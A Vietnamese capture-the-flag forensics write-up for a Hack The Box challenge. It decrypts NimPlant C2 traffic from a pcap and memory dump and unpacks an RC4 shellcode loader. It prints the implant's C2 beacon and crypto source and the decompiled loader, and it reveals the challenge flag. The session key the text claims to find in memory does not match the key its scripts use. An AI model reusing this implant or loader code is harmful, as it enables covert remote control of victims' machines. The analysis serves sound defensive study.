<img width="1082" height="610" alt="image" src="https://github.com/user-attachments/assets/f29e7a35-9b1a-41be-a695-bc77908922a9" />Write-up: HTB — The Art of Capture

Challenge Scenario
I had a dream that my PC was captured by evil daemons. The next day, strange things started happening to it. There are two parts of the flag in this challenge.

Sau khi tải về chall cho mình 1 file dmp và 1 file pcap 

<img width="1892" height="296" alt="image" src="https://github.com/user-attachments/assets/660c1f2d-3673-4aed-92e3-eb92e3f947c8" />

Xem sơ qua file pcap , cụ thể là phần protocol thì thấy giao thức http có vấn đề, mình xem thử phần export object:

<img width="997" height="977" alt="image" src="https://github.com/user-attachments/assets/81aa88fd-21b3-48fe-9ee8-dd73b8e9b693" />

Mình xem thử packet http bất kì thì ở bên trong là phần payload đã bị mã hóa:

<img width="1877" height="935" alt="image" src="https://github.com/user-attachments/assets/582ff140-b11f-4aaf-80eb-177a2798314b" />

OK vậy giờ hướng giải quyết của chúng ta là decrypt traffic thông qua file dmp kia, file dmp là định dạng của 1 file mini dump crash report, tức là nó là 1 "screenshot" của 1 tiến trình bị crash tại 1 thời điểm nhất định, nó khác với file mem mà chúng ta thường hay gặp trong các thử thách DFIR vậy nên dùng volatility phân tích sẽ không khai thác được gì.

Vậy nên hướng giải quyết là dùng windbg , tiến hành load vào windbg thì chúng ta có thể biết đây là 1 mini dumo của DbgInfo.exe với lệnh !analyze

Mình dùng lệnh writement để trích cái process đó ra:

<img width="1026" height="332" alt="image" src="https://github.com/user-attachments/assets/ed4622e7-a347-4084-800d-196c256fba12" />

Load lên virustotal thì báo đỏ lè vậy nên chắc là malware rồi.

<img width="1852" height="977" alt="image" src="https://github.com/user-attachments/assets/8107be8f-00f5-4dc5-995d-d88826128c13" />

Trong phần details của virustotal thì có báo cáo của die là con malware này viết bằng nim , vậy nên ida và ghidra sẽ khó phân tích mã nguồn hơn, và thực tế là dúng như mình nghĩ load vào ida cũng kh thu được gì :)))

<img width="1855" height="593" alt="image" src="https://github.com/user-attachments/assets/84fa5cdd-f5b6-456a-a609-26f77ac109ba" />

Cụ thể là Nimplant : https://github.com/chvancooten/NimPlant/. Đây là các endpoint được xác định khi đối chiếu mã nguồn với traffic trong PCAP: 

Endpoint	    Vai trò theo luồng xử lý
/api/v2/login	Lấy ID và dữ liệu dùng để khởi tạo khóa
/api/v2/ping	Kiểm tra hoặc nhận task từ C2, tùy cấu hình taskPath
/api/v2/query	Gửi dữ liệu kết quả về C2, tùy cấu hình resultPath

Đây là các thành phần liên quan đến hoạt động của implant, đặc biệt là module webClient.nim. Trong mã nguồn của webClient.nim, hàm doRequest() xây dựng các HTTP request đến những endpoint được cấu hình sẵn như ở trên.

Các dấu hiệu này phù hợp với kiến trúc giao tiếp của NimPlant. Khi đối chiếu cả executable, mã nguồn và PCAP, do đó mình mới khẳng định mẫu đang phân tích có liên quan đến NimPlant và luồng giao tiếp với C2.

Đây là phần mã nguồn của module webClient.nim:

```
import base64, json, puppy
from strutils import split, toLowerAscii, replace
from unicode import toLower
from os import parseCmdLine
import crypto
import strenc

# Define the object with listener properties
type
    Listener* = object
        id* : string
        initialized* : bool
        registered* : bool
        listenerType* : string
        listenerHost* : string
        listenerIp* : string
        listenerPort* : string
        registerPath* : string
        sleepTime* : int
        sleepJitter* : float
        killDate* : string
        taskPath* : string
        resultPath* : string
        userAgent* : string
        cryptKey* : string

# HTTP request function
proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "") : Response =
    try:
        # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
        var target : string = toLowerAscii(li.listenerType) & "://"
        if li.listenerHost != "":
            target = target & li.listenerHost
        else:
            target = target & li.listenerIp & ":" & li.listenerPort
        target = target & path

        # GET request
        if (postKey == "" or postValue == ""):
            var headers: seq[Header]

            # Only send ID header once listener is registered
            if li.id != "":
                headers = @[
                        Header(key: "X-Identifier", value: li.id),
                        Header(key: "User-Agent", value: li.userAgent)
                    ]
            else:
                headers = @[
                        Header(key: "User-Agent", value: li.userAgent)
                    ]

            let req = Request(
                url: parseUrl(target),
                verb: "get",
                headers: headers,
                allowAnyHttpsCertificate: true,
                )

            return fetch(req)

        # POST request
        else:
            let req = Request(
                url: parseUrl(target),
                verb: "post",
                headers: @[
                    Header(key: "X-Identifier", value: li.id),
                    Header(key: "User-Agent", value: li.userAgent),
                    Header(key: "Content-Type", value: "application/json")
                    ],
                allowAnyHttpsCertificate: true,
                body: "{\"" & postKey & "\":\"" & postValue & "\"}"
                )
            return fetch(req)

    except:
        # Return a fictive error response to handle
        var errResponse = Response()
        errResponse.code = 500
        return errResponse

# Init NimPlant ID and cryptographic key via GET request to the registration path
# XOR-decrypt transmitted key with static value for initial exchange
proc init*(li: var Listener) : void =
    # Allow us to re-write the static XOR key used for pre-crypto operations
    const xor_key {.intdefine.}: int = 459457925

    var res = doRequest(li, li.registerPath)
    if res.code == 200:
        li.id = parseJson(res.body)["id"].getStr()
        li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
        li.initialized = true
    else:
        li.initialized = false

# Initial registration function, including key init
proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool) : void =
    # Once key is known, send a second request to register nimplant with initial info
    var data = %*
        [
            {
                "i": ipAddrInt,
                "u": username,
                "h": hostname,
                "o": osBuild,
                "p": pid,
                "P": pname,
                "r": riskyMode
            }
        ]
    var dataStr = ($data)[1..^2]
    let res = doRequest(li, li.registerPath, "data", encryptData(dataStr, li.cryptKey))

    if (res.code != 200):
        # Error at this point means XOR key mismatch, abort
        li.registered = false
    else:
        li.registered = true

type
  Command = object
    guid: string
    command: string
    args: seq[string]

# Watch for queued commands via GET request to the task path
proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
    var 
        res = doRequest(li, li.taskPath)
        cmdGuid : string
        cmd : string
        args : seq[string]

    # A connection error occurred, likely team server has gone down or restart
    if res.code != 200:
        cmd = obf("NIMPLANT_CONNECTION_ERROR")

        when defined verbose:
            echo obf("DEBUG: Connection error, got status code: "), res.code

    # Otherwise, parse task and arguments (if any)
    else:
        try:
            # Attempt to parse task (parseJson() needs string literal... sigh)
            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey) #.replace("\'", "\\\"")
            var parsedResponseData = parseJson(responseData)
            var jsonData = to(parsedResponseData, Command)


            # Get the task and task GUID from the response
            cmdGuid = jsonData.guid
            cmd = jsonData.command
            args = jsonData.args
        except:
            # No task has been returned
            cmdGuid = ""
            cmd = ""

    result = (cmdGuid, cmd, args)

# Return command results via POST request to the result path
proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : void =
    var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
    discard doRequest(li, li.resultPath, "data", encryptData(data, li.cryptKey))

# Announce that the kill timer has expired
proc killSelf*(li : Listener) : void =
    if li.initialized:
        postCommandResults(li, "", obf("NIMPLANT_KILL_TIMER_EXPIRED"))
```

Sau đấy thì mình tìm hàm giải mã, cụ thể là ở module crypto.nim.

```

import nimcrypto, base64, random
from strutils import strip

# Calculate the XOR of a string with a certain key
# This function is explicitly intended for use for pre-key exchange crypto operations (decoding key)
proc xorString*(s: string, key: int): string {.noinline.} =
    var k = key
    result = s
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
        k = k +% 1

# XOR a string to a sequence of raw bytes
# This function is explicitly intended for use with the embedded config file (for evasion)
proc xorStringToByteSeq*(str: string, key: int): seq[byte] {.noinline.} =
    let length = str.len
    var k = key
    result = newSeq[byte](length)

    # Bitwise copy since we can't use 'copyMem' since it will be called at compile-time
    for i in 0 ..< result.len:
        result[i] = str[i].byte

    # Do the XOR
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = uint8(result[i]) xor uint8((k shr f) and 0xFF)
        k = k +% 1

# XOR a raw byte sequence back to a string
proc xorByteSeqToString*(input: seq[byte], key: int): string {.noinline.} =
    let length = input.len
    var k = key

    # Since this proc is used at runtime, we can use 'copyMem'
    result = newString(length)
    copyMem(result[0].unsafeAddr, input[0].unsafeAddr, length)

    # Do the XOR and convert back to character
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
        k = k +% 1

# Get a random string
proc rndStr(len : int) : string =
    randomize()
    for _ in 0..(len-1):
        add(result, char(rand(int('A') .. int('z'))))

# Converts a string to the corresponding byte sequence.
# https://github.com/nim-lang/Nim/issues/14810
func convertToByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

# Converts a byte sequence to the corresponding string.
func convertToString(bytes: openArray[byte]): string {.inline.} =
    let length = bytes.len
    if length > 0:
        result = newString(length)
        copyMem(result[0].unsafeAddr, bytes[0].unsafeAddr, length)

# Decrypt a blob of encrypted data with the given key
proc decryptData*(blob: string, key: string): string =
    let 
        blobBytes = convertToByteSeq(decode(blob))
        iv = blobBytes[0 .. 15]
    var
        enc = newSeq[byte](blobBytes.len)
        dec = newSeq[byte](blobBytes.len)   
        keyBytes = convertToByteSeq(key)
        dctx: CTR[aes128]

    enc = blobBytes[16 .. ^1]
    dctx.init(keyBytes, iv)
    dctx.decrypt(enc, dec)
    dctx.clear()
    result = convertToString(dec).strip(leading=false, chars={'\0'})

# Encrypt a input string with the given key
proc encryptData*(data: string, key: string): string =
    let 
        dataBytes : seq[byte] = convertToByteSeq(data)
    var
        iv: string = rndStr(16)
        enc = newSeq[byte](len(dataBytes))
        dec = newSeq[byte](len(dataBytes))   
    dec = dataBytes
    var dctx: CTR[aes128]
    dctx.init(key, iv)
    dctx.encrypt(dec, enc)
    dctx.clear()
    result = encode(convertToByteSeq(iv) & enc)

```
Cơ chế mã hóa:
Mỗi payload là base64 của 16 byte IV ghép với ciphertext AES-128-CTR của một luồng gzip. Chuỗi xử lý gồm bốn bước, đi theo thứ tự ngược lại so với lúc implant mã hóa:
1. Lấy chuỗi base64 trong trường data của JSON rồi decode.
2. Tách 16 byte đầu làm IV, phần còn lại là ciphertext.
3. Giải mã AES-128-CTR với key và counter block khởi đầu bằng IV.
4. Giải nén gzip để ra nội dung gốc

Giờ chúng ta tìm session key trong ram và mình tìm được key là :kVUboRSaneIPXWg1, tại sao có vô số chuỗi mình lại nói chuỗi này là session key? nếu để ý thì tất cả những chuỗi còn lại 1 là các kí tự lặp , 2 là các hàm hệ thống, chỉ có chuỗi kVUboRSaneIPXWg1 là nghi vấn và đồng thời lại vừa khít 16 bytes để làm khóa cho AES.

<img width="1082" height="610" alt="image" src="https://github.com/user-attachments/assets/7e1b34d0-040d-4609-b584-e99d14ab79a9" />


Tiếp đến là phân tích giao thức C2 trong pcap: C2 nói chuyện bằng HTTP và JSON trên cổng 4444, và chỉ có ba endpoint cần quan tâm: /api/v2/login, /api/v2/ping và /api/v2/query. Dữ liệu có ích nằm ở query, vì các body lớn đều đi qua đó.

Mình tiến hành trích payload bằng tshark với lệnh bash : tshark -r capture.pcapng -Y "http.file_data" -T fields -e frame.number -e frame.time_relative -e http.request.method -e http.request.uri -e http.file_data | Out-File -Encoding ascii http_payloads.txt

<img width="1885" height="866" alt="image" src="https://github.com/user-attachments/assets/70980ede-4432-4d84-ad24-7fbf5df7d4c6" />

Sau đấy mình viết script decrypt payload:
```
import base64, gzip, json, re
from Crypto.Cipher import AES
from Crypto.Util import Counter

KEY = b"ZjLtHquGbCxfsnoS"

def decrypt(b64: str) -> bytes:
    raw = base64.b64decode(b64)
    iv, ct = raw[:16], raw[16:]
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, "big"))
    pt = AES.new(KEY, AES.MODE_CTR, counter=ctr).decrypt(ct)
    return gzip.decompress(pt) if pt[:2] == b"\x1f\x8b" else pt

def sniff_ext(b: bytes) -> str:
    if b[:4] == b"\x89PNG": return ".png"
    if b[:2] == b"MZ":      return ".exe"
    if b[:2] == b"\x1f\x8b": return ".gz"
    return ".bin"

for line in open("http_payloads.txt", encoding="utf-16"):
    parts = re.split(r"[\t$]", line.rstrip("\n"), maxsplit=4)
    if len(parts) < 5 or not parts[4]:
        continue
    frame, _, method, uri, hex_body = parts
    try:
        body = json.loads(bytes.fromhex(hex_body))
    except Exception:
        continue
    print(f"\n=== Frame {frame} {method or 'RESP'} {uri}")
    for k in ("data", "t"):
        if k not in body:
            continue
        pt = decrypt(body[k])
        try:
            j = json.loads(pt.replace(b"'", b'"'))   
        except Exception:
            print(f"  [{k}] {len(pt)} bytes, head={pt[:60]!r}")
            open(f"frame{frame}{sniff_ext(pt)}", "wb").write(pt)
            continue
        print(f"  [{k}] {j}")
        res = j.get("result") if isinstance(j, dict) else None
        if isinstance(res, str):
            try:
                inner = base64.b64decode(res)
                if inner[:2] == b"\x1f\x8b":
                    inner = gzip.decompress(inner)
                name = f"frame{frame}_result{sniff_ext(inner)}"
                open(name, "wb").write(inner)
                print(f"    result -> {name} ({len(inner)} bytes) head={inner[:40]!r}")
            except Exception as e:
                print("    result decode error:", e)
```
Mình thu được output như sau:


<img width="1912" height="887" alt="image" src="https://github.com/user-attachments/assets/41d8ca60-6dc0-478f-b18a-d72902cf76fe" />


Đến đây mình để ý tới 2 phần , 1 phần là screenshot và 1 cái còn lại là kẻ tấn công đã upload lên 1 file là rev.exe

Task screenshot: 

<img width="1917" height="836" alt="image" src="https://github.com/user-attachments/assets/49b3643f-2a50-49b7-a4dc-0563c8340510" />

Task upload file rev.exe:

<img width="1866" height="370" alt="image" src="https://github.com/user-attachments/assets/a5c88e84-16a4-486c-9932-5e74d439e488" />

Mình quyết định làm task screenshot trước, vì là ảnh chụp màn hình nên mình nghĩ output chắc chắn là 1 bức ảnh png, đàu tiên mình thử decode lại phần payload b64 trước.

<img width="1917" height="962" alt="image" src="https://github.com/user-attachments/assets/2e3c55d3-a846-415e-8bb8-9fd4d026fff3" />

Đến đây mình để ý tới phần header H4sI đây là 4 ký tự base64 đầu của mọi file gzip, vì nó mã hóa 1f 8b 08. Gặp chuỗi bắt đầu bằng H4sI là biết đó là gzip đã bị base64. vậy nên để decrypt mình phải bóc qua 2 lớp base64 và 1 lớp gzip.

<img width="1550" height="901" alt="image" src="https://github.com/user-attachments/assets/9ebbb5a3-e939-4214-abb3-95ea9da64ed0" />

Đến đây thì header PNG rành rành ở trước mắt lưu về mở ra mình thu được part1 của flag:

<img width="1860" height="965" alt="image" src="https://github.com/user-attachments/assets/e07e16f7-06e7-4a4c-a064-3b0d107f26de" />

Tiếp đến là part2 , chắc chắn nó nằm trong rev.exe, việc cần làm trước mắt là mình sẽ export nó ra và đọc src vậy thì trích rev.exe thế nào?

<img width="1857" height="342" alt="image" src="https://github.com/user-attachments/assets/3009578e-8c9c-42cf-91d5-6e1f78280c7e" />

Có 1 thông tin hữu ích là rev.exe có id là 37fd453cbfb4794f48283819f010a9fe nhưng khi mình lọc trong wireshark thì tìm không thấy, vậy nên mình đoán id này không tồn tại trong wireshark dưới dạng plaintext hoặc lưu trong phần body, header, vậy nên mình lần theo khoảng frame từ 385 cho tới 452.

Bash: tshark -r capture.pcapng -Y "frame.number>=385 && frame.number<=452 && http" -T fields -e frame.number -e ip.src -e http.request.method -e http.request.uri -e http.response.code -e http.content_length

<img width="1480" height="658" alt="image" src="https://github.com/user-attachments/assets/73ba1b91-11f9-4fcd-8697-3a4dc9beaee6" />

Là rõ, rev.exe tồn tại ở trong frame 422. Xác định được rev.exe rồi giờ mình viết script để trích nó ra, lưu ý là zlib nhé chứ không phải gzip, tại vì ban đầu mình nghĩ là gzip xong check magicbytes mới biết là zlib.

extract_rev.exe
```
import base64, gzip, hashlib, json, re
from Crypto.Cipher import AES
from Crypto.Util import Counter

KEY = b"ZjLtHquGbCxfsnoS"
FRAME = "422"

def decrypt(b64: str) -> bytes:
    raw = base64.b64decode(b64)
    iv, ct = raw[:16], raw[16:]
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, "big"))
    return AES.new(KEY, AES.MODE_CTR, counter=ctr).decrypt(ct)

body = None
for line in open("http_payloads.txt", encoding="utf-16"):
    p = re.split(r"[\t$]", line.rstrip("\r\n"), maxsplit=4)
    if len(p) == 5 and p[0] == FRAME:
        body = bytes.fromhex(p[4])
        break

if body is None:
    raise SystemExit(f"Không thấy frame {FRAME} trong http_payloads.txt")

print("body:", len(body), "bytes, head =", body[:80])

# Xác định b64: JSON bọc hay base64 thuần
text = body.decode("utf-8", errors="ignore").strip()
b64 = text
try:
    j = json.loads(text)
    if isinstance(j, dict):
        b64 = max((v for v in j.values() if isinstance(v, str)), key=len)
        print("JSON keys:", list(j.keys()))
except Exception:
    pass

pt = decrypt(b64)
print("sau AES :", len(pt), "bytes, head =", pt[:16])

import zlib
if pt[:2] == b"\x1f\x8b":
    pt = gzip.decompress(pt)
    print("sau gunzip:", len(pt), "bytes, head =", pt[:16])
elif pt[:2] in (b"\x78\x01", b"\x78\x5e", b"\x78\x9c", b"\x78\xda"):
    pt = zlib.decompress(pt)
    print("sau zlib  :", len(pt), "bytes, head =", pt[:16])

open("rev.exe", "wb").write(pt)
print("MZ header:", pt[:2] == b"MZ")
print("sha256 :", hashlib.sha256(pt).hexdigest())
```

Đúng như mình nghĩ đây là 1 malware:

<img width="1912" height="927" alt="image" src="https://github.com/user-attachments/assets/de6039fb-c58b-4ba6-a2a7-9bde2ed8ab15" />

<img width="1831" height="925" alt="image" src="https://github.com/user-attachments/assets/52ce2c75-c025-4570-86bd-0e9de029ec63" />


Vì mình lười ném vào die nên mình đọc phần details luôn cho nhanh , con malware này được viết bằng C++ nên mình load vào IDA và đọc mã nguồn

Hàm main của malware:

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int ticks; // eax
  int v4; // ebx
  int v5; // ebx
  DWORD LastError; // eax
  int v7; // eax
  _BYTE *v8; // rcx
  unsigned __int8 v9; // r8
  char *v10; // r10
  int v11; // r9d
  char v12; // r11
  unsigned __int8 v13; // di
  __int64 i; // r11
  char v15; // r8
  _BYTE v17[264]; // [rsp+20h] [rbp-108h] BYREF
  DWORD flOldProtect; // [rsp+140h] [rbp+18h] BYREF
  __int64 v19; // [rsp+148h] [rbp+20h] BYREF

  ticks = Xtime_get_ticks();
  v19 = 5LL;
  v4 = ticks;
  sub_140001280(&v19);
  if ( (double)(int)(Xtime_get_ticks() - v4) / 10000000.0 <= 4.5 )
    exit(0);
  v5 = 0;
  flOldProtect = 0;
  if ( !VirtualProtect(qword_1400014B0, 0x2AFuLL, 0x40u, &flOldProtect) )
  {
    LastError = GetLastError();
    sub_140001030("Error: %d", LastError);
  }
  v7 = 0;
  v8 = v17;
  do
    *v8++ = v7++;
  while ( v7 < 256 );
  v9 = 0;
  v10 = v17;
  v11 = 0;
  do
  {
    v12 = *v10;
    v9 += *v10 + aXobvreX11mb[v11++ % 0xCu];
    *v10++ = v17[v9];
    v17[v9] = v12;
  }
  while ( v11 < 256 );
  v13 = 0;
  for ( i = 0LL; i < 687; ++i )
  {
    v5 = (v5 + 1) % 256;
    v15 = v17[v5];
    v13 += v15;
    v17[v5] = v17[v13];
    v17[v13] = v15;
    *((_BYTE *)qword_1400014B0 + i) ^= v17[(unsigned __int8)(v17[v5] + v15)];
  }
  VirtualProtect(qword_1400014B0, 0x2AFuLL, flOldProtect, &flOldProtect);
  ((void (*)(void))qword_1400014B0[0])();
  return 0;
}
```

Phân tích hành vi thực thi:

hàm main có cơ chế chống trì hoãn sandbox,giải mã payload trong bộ nhớ và chuyển quyền thực thi sang payload đã giải mã.Điểm đáng chú ý nhất là chương trình không trực tiếp thực thi toàn bộ logic từ đầu. Nó thay đổi quyền bảo vệ của một vùng nhớ, biến đổi dữ liệu tại qword_1400014B0 bằng một thuật toán có đặc điểm giống RC4, rồi gọi vùng nhớ đó như mã máy

Luồng thực thi của nó như sau:
```
1. Đo thời gian thực thi

Xtime_get_ticks() và sub_140001280()

2. Kiểm tra thời gian

Nếu thời gian không vượt ngưỡng 4,5 giây thì thoát

3. Thay đổi quyền bảo vệ bộ nhớ

VirtualProtect(..., 0x40, ...)

4. Khởi tạo và xáo trộn trạng thái

Mảng trạng thái 256 byte và khóa aXobvreX11mb

5. Biến đổi 687 byte dữ liệu

XOR vùng nhớ với chuỗi byte được tạo từ trạng thái

6. Khôi phục quyền bảo vệ và chuyển thực thi

Khôi phục bằng VirtualProtect, sau đó gọi qword_1400014B0[0]
```
Vậy là đã rõ thuật toán mã hóa là xor với key là aXobvreX11mb ,mình viết script để giải mã payload:

```
import re, struct

EXE  = "rev.exe"          # hoặc "rev.bin"
SIZE = 687                # 0x2AF
VA   = 0x1400014B0

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray()
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

raw = open(EXE, "rb").read()

# --- đọc PE thủ công: ImageBase + bảng section ---
pe_off   = struct.unpack_from("<I", raw, 0x3C)[0]
nsec     = struct.unpack_from("<H", raw, pe_off + 6)[0]
optsize  = struct.unpack_from("<H", raw, pe_off + 20)[0]
opt_off  = pe_off + 24
imagebase = struct.unpack_from("<Q", raw, opt_off + 24)[0]   # PE32+
sec_off  = opt_off + optsize

rva = VA - imagebase
file_off = None
for k in range(nsec):
    s = sec_off + 40 * k
    name = raw[s:s+8].rstrip(b"\x00").decode(errors="ignore")
    vsize, vaddr, rawsize, rawptr = struct.unpack_from("<IIII", raw, s + 8)
    if vaddr <= rva < vaddr + max(vsize, rawsize):
        file_off = rawptr + (rva - vaddr)
        print(f"blob nằm trong section {name}, file offset = {hex(file_off)}")
        break

if file_off is None:
    raise SystemExit("Không ánh xạ được địa chỉ blob sang file offset")

blob = raw[file_off:file_off + SIZE]
print("blob:", len(blob), "bytes, head =", blob[:16].hex())

def first_byte(key, c0):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % 12]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = (0 + 1) & 0xFF
    j = S[i]
    S[i], S[j] = S[j], S[i]
    return c0 ^ S[(S[i] + S[j]) & 0xFF]

hits = []
for m in re.finditer(rb"(?=([\x20-\x7e]{12}))", raw):
    key = m.group(1)
    if first_byte(key, blob[0]) != 0xFC:
        continue
    stage = rc4(key, blob)
    if stage[:2] in (b"\xfc\x48", b"\xfc\xe8") or stage[:3] == b"\xfc\x48\x83":
        hits.append((key, stage))

print("so key hop le:", len(hits))
for key, stage in hits:
    print("key =", key, " head =", stage[:8].hex())
    open("stage2.bin", "wb").write(stage)
    print("tail:", stage[-80:])
```

Cho chạy script mình thu được flag của part2:
<img width="1862" height="965" alt="image" src="https://github.com/user-attachments/assets/96ad555a-84bb-43a2-8574-7cd3834d073a" />

Ghép lại mình thu được flag hoàn chỉnh: HTB{B1G_Br0Th3r_1$_WatCH1ng_St4y_4l3Rt_4ND_r3Ly_0n_y0ur$3Lf}

<img width="1826" height="800" alt="image" src="https://github.com/user-attachments/assets/833e23fa-b3b5-4142-917e-b2b554e70013" />






















